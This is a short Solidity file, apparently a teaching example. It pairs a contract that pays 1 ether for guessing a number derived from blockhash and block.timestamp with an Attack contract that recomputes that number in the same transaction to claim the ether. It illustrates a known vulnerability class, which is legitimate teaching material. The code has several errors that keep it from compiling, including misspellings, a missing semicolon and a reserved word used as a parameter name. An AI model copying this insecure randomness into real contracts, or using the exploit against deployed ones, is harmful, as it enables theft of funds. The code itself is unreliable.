// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint guess) public {
        //block number -1 is the last block number, and that blockhash isnt random, neither is block.timestamp

        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )

        );

        if (guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether")
        }
    }
}

contract Attack {
    recieve () external payable {

    }
    //we can replicate the calculation of the guess number on our contract, and call the guess function on the same tx, therefore having the exact
    //same block.number and block.timestamp  
    function attack(GuessTheRandomNumber contract) public {
        uint answer = uin(keccak256(abi.encodePacked(blockhash(block.number -1 ), block.timestamp)));

        contract.guess(answer);
    }
}